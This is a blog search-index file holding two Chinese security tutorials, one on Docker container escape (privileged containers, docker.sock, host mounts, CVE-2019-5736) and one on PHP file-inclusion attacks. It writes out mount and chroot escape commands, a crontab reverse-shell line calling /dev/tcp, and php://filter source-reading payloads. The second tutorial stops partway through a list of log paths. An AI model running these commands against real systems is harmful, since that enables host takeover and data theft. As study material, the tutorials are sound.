<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Docker逃逸</title>
      <link href="/2022/11/10/docker_run_fast/"/>
      <url>/2022/11/10/docker_run_fast/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/01/b241b34e0f5346309f7393b05f2799d8.png" alt="在这里插入图片描述"><br><strong>注意：本篇文章仅用于学习记录，不得用于其他用途。</strong></p><h1 id="一、docker逃逸"><a href="#一、docker逃逸" class="headerlink" title="一、docker逃逸"></a>一、docker逃逸</h1><p>docker逃逸就是从当前docker容器权限中逃逸出来，获得宿主机的权限。</p><h1 id="二、常见的逃逸方法"><a href="#二、常见的逃逸方法" class="headerlink" title="二、常见的逃逸方法"></a>二、常见的逃逸方法</h1><h2 id="1、配置不当引起的逃逸"><a href="#1、配置不当引起的逃逸" class="headerlink" title="1、配置不当引起的逃逸"></a>1、配置不当引起的逃逸</h2><h3 id="（1）Docker-Remote-API未授权访问"><a href="#（1）Docker-Remote-API未授权访问" class="headerlink" title="（1）Docker Remote API未授权访问"></a>（1）Docker Remote API未授权访问</h3><h3 id="（2）docker-sock挂载到容器内部"><a href="#（2）docker-sock挂载到容器内部" class="headerlink" title="（2）docker.sock挂载到容器内部"></a>（2）docker.sock挂载到容器内部</h3><h3 id="（3）privileged特权模式启动docker"><a href="#（3）privileged特权模式启动docker" class="headerlink" title="（3）privileged特权模式启动docker"></a>（3）privileged特权模式启动docker</h3><h3 id="（4）挂载敏感目录（如：宿主机根目录）"><a href="#（4）挂载敏感目录（如：宿主机根目录）" class="headerlink" title="（4）挂载敏感目录（如：宿主机根目录）"></a>（4）挂载敏感目录（如：宿主机根目录）</h3><h2 id="2、Docker软件设计引起的逃逸（漏洞）"><a href="#2、Docker软件设计引起的逃逸（漏洞）" class="headerlink" title="2、Docker软件设计引起的逃逸（漏洞）"></a>2、Docker软件设计引起的逃逸（漏洞）</h2><h3 id="（1）runC容器逃逸漏洞（CVE-2019-5736）"><a href="#（1）runC容器逃逸漏洞（CVE-2019-5736）" class="headerlink" title="（1）runC容器逃逸漏洞（CVE-2019-5736）"></a>（1）runC容器逃逸漏洞（CVE-2019-5736）</h3><h3 id="（2）Docker-cp命令（CVE-2019-14271）"><a href="#（2）Docker-cp命令（CVE-2019-14271）" class="headerlink" title="（2）Docker cp命令（CVE-2019-14271）"></a>（2）Docker cp命令（CVE-2019-14271）</h3><h2 id="3、内核漏洞引起的逃逸"><a href="#3、内核漏洞引起的逃逸" class="headerlink" title="3、内核漏洞引起的逃逸"></a>3、内核漏洞引起的逃逸</h2><p>脏牛漏洞，实战遇到的也不多，逃逸的原理是宿主机的内核有脏牛提权漏洞，docker容器又是和宿主机公用一套内核的，所在docker容器内使用脏牛拿的root shell，是内核级别的，即拿到了宿主机的root shell。</p><h2 id="4、如何判断是宿主机还是docker容器"><a href="#4、如何判断是宿主机还是docker容器" class="headerlink" title="4、如何判断是宿主机还是docker容器"></a>4、如何判断是宿主机还是docker容器</h2><h3 id="（1）检查根目录下-x2F-dockerenv文件是否存在"><a href="#（1）检查根目录下-x2F-dockerenv文件是否存在" class="headerlink" title="（1）检查根目录下.&#x2F;dockerenv文件是否存在"></a>（1）检查根目录下.&#x2F;dockerenv文件是否存在</h3><p>ls -la .&#x2F;dockerenv</p><h3 id="（2）检查-x2F-proc-x2F-1-x2F-cgroup内是否包含”docker”等字符串"><a href="#（2）检查-x2F-proc-x2F-1-x2F-cgroup内是否包含”docker”等字符串" class="headerlink" title="（2）检查&#x2F;proc&#x2F;1&#x2F;cgroup内是否包含”docker”等字符串"></a>（2）检查&#x2F;proc&#x2F;1&#x2F;cgroup内是否包含”docker”等字符串</h3><p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p><h3 id="（3）其他特征"><a href="#（3）其他特征" class="headerlink" title="（3）其他特征"></a>（3）其他特征</h3><p>容器ip大多是172.17段，而且很多常见的命令缺失。</p><h1 id="三、配置不当引起的逃逸"><a href="#三、配置不当引起的逃逸" class="headerlink" title="三、配置不当引起的逃逸"></a>三、配置不当引起的逃逸</h1><h2 id="1、Docker-Remote-API未授权访问"><a href="#1、Docker-Remote-API未授权访问" class="headerlink" title="1、Docker Remote API未授权访问"></a>1、Docker Remote API未授权访问</h2><p><strong>先看一眼Docker Remote API是否存在未授权，2375端口是否开放。</strong><br>docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可以直接调用API来操作docker。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">列出容器信息，效果与docker <span class="built_in">ps</span>一致</span><br><span class="line"><span class="built_in">curl</span> http://&lt;target&gt;：<span class="number">2375</span>/containers/json</span><br></pre></td></tr></table></figure><p><strong>环境准备</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/01/20a84891ecdf4172b90ca05649c5ae86.png" alt="在这里插入图片描述"><br><strong>漏洞原理</strong><br>在使用docker swarm的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上<br>利用思路：通过挂在宿主机的目录，写定时任务获取shell，从而逃逸。<br><strong>漏洞利用</strong></p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/a98a93ccaf2f4e49b7e972a176e491e1.png" alt="在这里插入图片描述"></p><h2 id="2、挂载Docker-sock"><a href="#2、挂载Docker-sock" class="headerlink" title="2、挂载Docker.sock"></a>2、挂载Docker.sock</h2><p>指的是容器在启动的时候，挂载了&#x2F;var&#x2F;run&#x2F;docker.sock，一般很少遇到。<br>&#x2F;var&#x2F;run&#x2F;docker.sock是Docker守护程序默认监听的Unix套接字，它也是一个用于从容器内与Docker守护进程通信的工具。<br><strong>实验环境准备</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-it</span> <span class="literal">-v</span> /var/run/docker.sock:/var/run/docker.sock ubuntu:<span class="number">18.04</span></span><br></pre></td></tr></table></figure><p>随后在docker容器中安装docker</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ubuntu 18.04 安装docker</span></span><br><span class="line">apt<span class="literal">-get</span> update</span><br><span class="line"><span class="comment"># 安装依赖包</span></span><br><span class="line">apt<span class="literal">-get</span> install apt<span class="literal">-transport-https</span> ca<span class="literal">-certificates</span> <span class="built_in">curl</span> gnupg<span class="literal">-agent</span> software<span class="literal">-properties-</span> common</span><br><span class="line"><span class="comment"># 添加 Docker 的官方 GPG 密钥</span></span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg | apt<span class="literal">-key</span> add -</span><br><span class="line"><span class="comment"># 验证您现在是否拥有带有指纹的密钥</span></span><br><span class="line">apt<span class="literal">-key</span> fingerprint <span class="number">0</span>EBFCD88</span><br><span class="line"><span class="comment"># 设置稳定版仓库</span></span><br><span class="line"><span class="built_in">add-apt</span><span class="literal">-repository</span> <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$</span>(lsb_release -cs) stable&quot;</span></span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">apt<span class="literal">-get</span> update</span><br><span class="line"><span class="comment"># 安装最新的Docker-ce</span></span><br><span class="line">apt<span class="literal">-get</span> install docker<span class="literal">-ce</span></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">systemctl enable docker systemctl <span class="built_in">start</span> docker</span><br></pre></td></tr></table></figure><p>安装完成后我们使用docker ps就可以看到宿主机上的容器了。<br><strong>漏洞利用</strong><br>将宿主机的根目录之间挂载到容器中的容器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-it</span> <span class="literal">-v</span> /:/uzju ubuntu:<span class="number">18.04</span> /bin/bash</span><br><span class="line">chroot uzju</span><br></pre></td></tr></table></figure><h2 id="3、Docker特权容器逃逸"><a href="#3、Docker特权容器逃逸" class="headerlink" title="3、Docker特权容器逃逸"></a>3、Docker特权容器逃逸</h2><p>实战中要先看一下是不是特权容器。<br>docker中存在一些比较高危的启动命苦，基于容器较大的权限，允许执行一些特权操作，在一定的条件下，可以导致容器逃逸。<br><strong>利用原理</strong><br>特权容器可以直接在容器内挂载整个宿主机的磁盘，通过计划任务反弹宿主机的shell，进而实现了容器逃逸。<br><strong>漏洞复现</strong><br>通过特权模式运行一个容器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="literal">-it</span> <span class="literal">--privileged</span> ubuntu:<span class="number">18.04</span></span><br></pre></td></tr></table></figure><p>查看当前容器是否是特权容器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/<span class="number">1</span>/status | grep Cap</span><br><span class="line">如果查询出来的值是<span class="number">00000003</span>ffffffff，那么可以说明当前容器是特权容器。</span><br></pre></td></tr></table></figure><p>在容器内，查看磁盘文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk <span class="literal">-l</span></span><br></pre></td></tr></table></figure><p>可以直接挂载宿主机的磁盘</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ysz</span><br><span class="line"><span class="built_in">mount</span> /dev/sda5 ysz/</span><br><span class="line">chroot /ysz</span><br></pre></td></tr></table></figure><p>查看宿主机的etc&#x2F;passwd</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><p>写计划任务反弹shell<br><img src="http://120.48.107.243:9090/blog/2023/04/01/af7902582522442380edb2ef90377130.png" alt="在这里插入图片描述"></p><h2 id="4、挂载宿主根目录"><a href="#4、挂载宿主根目录" class="headerlink" title="4、挂载宿主根目录"></a>4、挂载宿主根目录</h2><p><strong>环境准备</strong><br>docker run -it -v &#x2F;:&#x2F;11111&#x2F;ubuntu:18.04<br><strong>漏洞利用</strong><br>还是一样可以通过crontab反弹shell<br>chroot uzju<br>uzju是对应容器的目录。<br>crontab -e<br>*****&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p><h1 id="四、CVE-2019-5736"><a href="#四、CVE-2019-5736" class="headerlink" title="四、CVE-2019-5736"></a>四、CVE-2019-5736</h1><p>需要管理员再次手动进入容器触发。<br><strong>漏洞原理</strong><br>漏洞点在于runC，runC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来，作为低级别容器运行时，runC主要由高级别容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具，像docker这样高级别容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器，将进程附加到现有容器等。<br><strong>在Docker18.09.2之前的版本中使用的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc二进制文件，攻击者可以在宿主机上以root身份执行命令。</strong><br><strong>影响版本</strong><br>docker version &lt;&#x3D; 18.09.2<br>runc version &lt;&#x3D; 1.0-rc6<br><strong>环境搭建</strong><br>ubuntu18.04</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt update</span><br><span class="line">apt install lrzsz</span><br><span class="line">apt install <span class="built_in">curl</span></span><br><span class="line">apt install openssh<span class="literal">-server</span></span><br><span class="line">service sshd status</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/9ae347342e6e4fc2a6511a1e45591349.png" alt="在这里插入图片描述"><br><strong>漏洞复现</strong><br>exp<br><img src="http://120.48.107.243:9090/blog/2023/04/01/922e7f98b9e84621a50398d6a944670c.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/01/963a40dbbedd485db33dfc1810223b8f.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/7a1e01036b7c43db8cd6ace8681c96bf.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/01/1f96163ad1f6470cb43d24151b6e27a6.png" alt="在这里插入图片描述"><br><strong>编译</strong><br>set GOARCH&#x3D;amd64<br>set GOOS&#x3D;linux<br>go build main.go<br><strong>将编译好的main文件上传至docker容器</strong><br>使用wget命令。<br><strong>在docker容器中运行文件。</strong><br><img src="http://120.48.107.243:9090/blog/2023/04/01/68f83fcf177448db831e5eacbd9b0769.png" alt="在这里插入图片描述"><br>接收反弹的shell，可以发现是宿主机。<br><strong>解决方案：</strong><br>盛极docker到最新的版本。<br><strong>这个方法逃逸后，动静大，容器坏了，进不去也结束不了。</strong></p><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>1、docker remote api未授权访问，使用api创建一个挂在了宿主机根目录的容器，实现逃逸。</p><p>2、如果当前容器挂载了&#x2F;var&#x2F;run&#x2F;docker.sock，可以在容器里面安装docker，拉取镜像，创建容器，然后挂载宿主机的根目录。</p><p>3、如果容器是使用特权创建的，即创建的时候使用了–privileged参数，可以直接挂载宿主的磁盘到容器中，进而实现逃逸。</p><p>4、如果容器挂载了宿主机根目录，直接使用chroot切换到宿主机的shell，进而实现逃逸。</p><p>5、利用存在的漏洞逃逸，如，runC容器逃逸漏洞（CVE-2019-5736），Docker cp命令（CVE-2019-14271）等。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞的学习</title>
      <link href="/2022/11/01/file_include/"/>
      <url>/2022/11/01/file_include/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>程序在引用文件的时候，引用的文件名，用户可控的情况，传入的文件名没有经过合理的校验或者校验不严，从而操作了预想之外的文件，就有可能导致文件泄露和恶意的代码注入。<br>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这重文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞PHP Web Application中居多，而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。</p><h1 id="二、常见文件包含函数"><a href="#二、常见文件包含函数" class="headerlink" title="二、常见文件包含函数"></a>二、常见文件包含函数</h1><p><img src="https://img-blog.csdnimg.cn/9f7a58f61a7e4c3e9944479231333009.png" alt="在这里插入图片描述"></p><h1 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h1><h2 id="1、敏感信息泄露"><a href="#1、敏感信息泄露" class="headerlink" title="1、敏感信息泄露"></a>1、敏感信息泄露</h2><h2 id="2、拒绝服务攻击"><a href="#2、拒绝服务攻击" class="headerlink" title="2、拒绝服务攻击"></a>2、拒绝服务攻击</h2><h2 id="3、执行恶意代码"><a href="#3、执行恶意代码" class="headerlink" title="3、执行恶意代码"></a>3、执行恶意代码</h2><h2 id="4、配合文件上传，扩大危害"><a href="#4、配合文件上传，扩大危害" class="headerlink" title="4、配合文件上传，扩大危害"></a>4、配合文件上传，扩大危害</h2><p>一般来说，远程文件包含漏洞危害更大。</p><h1 id="四、利用前提"><a href="#四、利用前提" class="headerlink" title="四、利用前提"></a>四、利用前提</h1><h2 id="1、web应采用include-等文件包含函数通过动态变量的方式引入需要包含的文件"><a href="#1、web应采用include-等文件包含函数通过动态变量的方式引入需要包含的文件" class="headerlink" title="1、web应采用include()等文件包含函数通过动态变量的方式引入需要包含的文件"></a>1、web应采用include()等文件包含函数通过动态变量的方式引入需要包含的文件</h2><h2 id="2、用户能够控制该动态变量"><a href="#2、用户能够控制该动态变量" class="headerlink" title="2、用户能够控制该动态变量"></a>2、用户能够控制该动态变量</h2><h1 id="五、两个关键选项"><a href="#五、两个关键选项" class="headerlink" title="五、两个关键选项"></a>五、两个关键选项</h1><p>Allow_url_fopen &#x3D; on<br>是否允许将URL（HTTP,HTTPS等）作为文件打开处理，默认开启<br>Allow_url_include&#x3D; on<br>是否允许include（）和require（）函数包含URL（HTTP,HTTPS）作为文件处理，默认关闭，远程文件包含必须为开启。</p><h1 id="六、挖掘"><a href="#六、挖掘" class="headerlink" title="六、挖掘"></a>六、挖掘</h1><p>抓包观察有无明显的参数用于打开或使用文件，在漏洞挖掘过程中，注意下即可，如果遇到疑似文件包含，可以使用以下的测试方法。<br>a.php是fileinclude.php的同⼀⽬录的⽂件 <a href="http://www.aaa.com/fileinclude.php?file=file://a.php">http://www.aaa.com/fileinclude.php?file=file://a.php</a><br>打开⽬标⽹站，⼀般不会被过滤掉 <a href="http://www.aaa.com/fileinclude.php%EF%BC%9Ffile=http://www.aaa.com">http://www.aaa.com/fileinclude.php？file=http://www.aaa.com</a><br>因为不知道对参数的过滤方式，因此该方法不一定成功。</p><h1 id="七、本地文件包含（LFI）"><a href="#七、本地文件包含（LFI）" class="headerlink" title="七、本地文件包含（LFI）"></a>七、本地文件包含（LFI）</h1><p>能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。<br>重要特点：把任何包含进来的文件都当作PHP文件来执行。<br>下面是pikachu靶场的源码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ce48277d32ea49d3b218053a10e7a74d.png" alt="在这里插入图片描述"><br>$_GET[‘filename’] 接收客户端传的参数，其中没有任何过滤带⼊到 include 函数中， include 包含这个⽂件，引⼊到当前⽂件中，因此会造成⽂件包含漏洞； ⽐如：<a href="http://pikachu.com/vul/fileinclude/fi_local.php?filename=123.jpg">http://pikachu.com/vul/fileinclude/fi_local.php?filename=123.jpg</a> 1.jpg是图⽚，但是当有⽂件包含漏洞时，这个图⽚会被当做 php ⽂件处理，当然前提是它 ⾥⾯有 php 的代码，这样我们就可以先写⼀个 php 代码的⽊⻢，然后伪装成图⽚上传，从⽽ 达到控制对⽅的⽬的。</p><h1 id="八、php伪协议"><a href="#八、php伪协议" class="headerlink" title="八、php伪协议"></a>八、php伪协议</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen（）、copy（）、file_exists()和filesize（）的文件系统函数，除了这些封装协议，还能通过stream_wrapper_register()来注册自定义的封装协议。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b1eac8e3cf584ddbb982b0c142d52079.png" alt="在这里插入图片描述"><br>可以在phpinfo中的Registered PHP Streams中找到可使用的协议。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b7026958422e4ddaab6d00981be34bb2.png" alt="在这里插入图片描述"></p><h2 id="2、测试环境"><a href="#2、测试环境" class="headerlink" title="2、测试环境"></a>2、测试环境</h2><p>测试代码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4c7fd1161d164db19d1865f00a683cbb.png" alt="在这里插入图片描述"><br>php.ini配置<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1e3f080e5d1a4653ab22f1c3f6d3663d.png" alt="在这里插入图片描述"><br>各协议的利用条件和方法<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3f89da85e52f4cccbdd113d3b519965d.png" alt="在这里插入图片描述"></p><h2 id="1、PHP：-x2F-x2F-filter"><a href="#1、PHP：-x2F-x2F-filter" class="headerlink" title="1、PHP：&#x2F;&#x2F;filter"></a>1、PHP：&#x2F;&#x2F;filter</h2><p>php：&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。<br>参数<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9dca8244ca594b22b04c7a7f81ebdedc.png" alt="在这里插入图片描述"><br>过滤器列表<br>字符串过滤器<br>String.strip_tags<br>转换过滤器<br>压缩过滤器<br>加密过滤器<br>可⽤过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a><br>利用姿势1：<br>？file&#x3D;php：filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行，虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的，同时也能够对网站源码进行审计。<br>利用姿势2：<br>？file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php<br>效果跟前面一样，只是少了个read关键字，在绕过一些waf时也许有用。<br>file:&#x2F;&#x2F;<br>专门用于访问本地文件系统和php:&#x2F;&#x2F;filter类似都可以对本地文件进行读取。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7964045fa16844588e6d3fdd9966d189.png" alt="在这里插入图片描述"></p><h2 id="2、PHP：-x2F-x2F-input"><a href="#2、PHP：-x2F-x2F-input" class="headerlink" title="2、PHP：&#x2F;&#x2F;input"></a>2、PHP：&#x2F;&#x2F;input</h2><p>PHP:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，将post请求中的数据作为php代码执行。<br>利用条件：<br>Allow_url_fopen &#x3D;on<br>Allow_url_include&#x3D;on<br>注意：当entype&#x3D;“multipart&#x2F;form-data”，php：&#x2F;&#x2F;input是无效的<br>利用姿势：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3a7aa67f323b47a280673e5f1c13288a.png" alt="在这里插入图片描述"><br>也可以使用curl进行利用<br><img src="http://120.48.107.243:9090/blog/2023/04/03/caa97ec7997c465ebe4f7529e0899ca8.png" alt="在这里插入图片描述"><br>GETSHELL<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5476446ae226401c9f54b754743f386f.png" alt="在这里插入图片描述"></p><h2 id="3、Phar-x2F-x2F"><a href="#3、Phar-x2F-x2F" class="headerlink" title="3、Phar:&#x2F;&#x2F;"></a>3、Phar:&#x2F;&#x2F;</h2><p>Phar:&#x2F;&#x2F;支持zip、phar格式的文件包含。</p><h3 id="（1）zip"><a href="#（1）zip" class="headerlink" title="（1）zip"></a>（1）zip</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ac419054735c4cf0b59687018f41fbc1.png" alt="在这里插入图片描述"><br>利用条件：php&gt;&#x3D;5.3.0<br>利用姿势1：配合文件上传漏洞，当仅可以上传zip格式时。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/25a24bcce9494447b4e38247f7ce6ca6.png" alt="在这里插入图片描述"><br>新建shell.php，使用zip格式压缩→shell.zip<br>新建shell.php，使用zip格式压缩→shell.zip<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d35291077f6641f68aa237cd5fd18aad.png" alt="在这里插入图片描述"><br>利用姿势2：<br>配合文件上传漏洞，当仅可以上传图片格式时。<br>针对phar:&#x2F;&#x2F;不管后缀是什么，都会当做压缩包来解压。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/539e33c1fc094a3d8a3e35d968409d2f.png" alt="在这里插入图片描述"><br>将做好的zip后缀改为png格式。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5be53bc9d14f4d409fe92415db9e0e81.png" alt="在这里插入图片描述"></p><h3 id="（2）phar"><a href="#（2）phar" class="headerlink" title="（2）phar"></a>（2）phar</h3><p>phar文件本质上也是一种压缩文件。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cf92c6ac36c1408fb67feab21d06e9c9.png" alt="在这里插入图片描述"><br>制作phar文件：<br>制作包含恶意代码文件的phar文件<br>1、确保本地php.ini中phar.readonly&#x3D;off<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a39cb2d9b6444ec9a7049ea83a38add3.png" alt="在这里插入图片描述"><br>2、编写恶意phar文件的php脚本<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dbc2e5de3942440fb821000b4f73c5cf.png" alt="在这里插入图片描述"><br>利用条件：php&gt;&#x3D;5.3.0<br>利用姿势1：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/04f6e8aaa64849f08a7cb8816397b4ea.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/0a3d310bd9ea4746ae2e3d9faef7eec0.png" alt="在这里插入图片描述"><br>利用姿势2：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/aa49429dc7c741fdb85fb4ce99de87f4.png" alt="在这里插入图片描述"><br>利用协议特性，更改后缀文件可适当绕过一些限制。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c8984f00ee934e518c9e1e8df3fff4e5.png" alt="在这里插入图片描述"></p><h2 id="3、zip：-x2F-x2F"><a href="#3、zip：-x2F-x2F" class="headerlink" title="3、zip：&#x2F;&#x2F;"></a>3、zip：&#x2F;&#x2F;</h2><p>zip协议和phar协议类似，都支持相对路径和绝对路径。<br>在php version 5.2.9事已经修复zip：&#x2F;&#x2F;相对路径问题。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8b55e044eda14c18951a0c254db11c9a.png" alt="在这里插入图片描述"><br>使用zip协议，需要将#编码为%23（浏览器时）<br><img src="http://120.48.107.243:9090/blog/2023/04/03/806497a4c72e4604ac203ac8f9890232.png" alt="在这里插入图片描述"><br>利用条件：php&gt;&#x3D;5.2（绝对路径） php&gt;&#x3D;5.29(相对&#x2F;绝对路径)<br>利用姿势1：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3d31b2cf79464801bbf0e8b7862cd062.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/59c4148a2c1b4b4bae14f4630ae16c46.png" alt="在这里插入图片描述"></p><p>利用姿势2：<br>针对zip：&#x2F;&#x2F;不管后缀是什么，都会当做压缩包来解压，可以适当的绕过一些限制。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/28f3a704785a4fb29c69f05811004c9b.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/03cb54de75cf44d59bfb8401cb944c48.png" alt="在这里插入图片描述"></p><h3 id="4、bzip2：-x2F-x2F"><a href="#4、bzip2：-x2F-x2F" class="headerlink" title="4、bzip2：&#x2F;&#x2F;"></a>4、bzip2：&#x2F;&#x2F;</h3><p>需要安装，这里不做介绍</p><h3 id="5、zlib：-x2F-x2F"><a href="#5、zlib：-x2F-x2F" class="headerlink" title="5、zlib：&#x2F;&#x2F;"></a>5、zlib：&#x2F;&#x2F;</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/52734713b13d482d95b6838e10b095ae.png" alt="在这里插入图片描述"><br>利用条件：php&gt;&#x3D;5.2<br>利用姿势1：<br>?file&#x3D;compress.zlib:&#x2F;&#x2F;shell.gz<br><img src="http://120.48.107.243:9090/blog/2023/04/03/81c54f8edede4984bebea96fe420b323.png" alt="在这里插入图片描述"></p><h3 id="6、data-x2F-x2F"><a href="#6、data-x2F-x2F" class="headerlink" title="6、data:&#x2F;&#x2F;"></a>6、data:&#x2F;&#x2F;</h3><p>数据流封装器，和php:&#x2F;&#x2F;相似都是利用了流的概念。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d4e7c586954b4a0ab73105aceea67fc3.png" alt="在这里插入图片描述"><br>利用条件<br><img src="http://120.48.107.243:9090/blog/2023/04/03/524830224cb64c1fb627953679f9b389.png" alt="在这里插入图片描述"></p><h1 id="九、包含日志getshell"><a href="#九、包含日志getshell" class="headerlink" title="九、包含日志getshell"></a>九、包含日志getshell</h1><p>中间件例如iis、apache、nginx这些web中间件，都会记录访问日志，如果访问日志中或错误日志中，存在有php代码，也可以引入到文件包含中，如果日志有php恶意代码，也可以导致getshell。<br>利用条件：<br>1、需要知道服务器日志的存储路径<br>2、日志文件可读<br>在linux下日志文件权限默认是root而php的权限是<a href="http://www.data一般情况下是读取不了,如果是windows环境下是可以读取的,权限是允许的./">www.data一般情况下是读取不了，如果是windows环境下是可以读取的，权限是允许的。</a><br>日志路径：<br>Linux：<br>Apache：<br>    &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log<br>     &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log<br>    配置⽂件：&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<br>     index.php?page&#x3D;&#x2F;etc&#x2F;init.d&#x2F;httpd<br>Nginx：<br>    ⽇志⽂件在⽤户安装⽬录logs⽬录下<br>    例如：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs<br>Win：<br>     IIS6.0+win2003： C:\WINDOWS\system32\Logfiles<br>        配置⽂件：C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;metabase.xml<br>    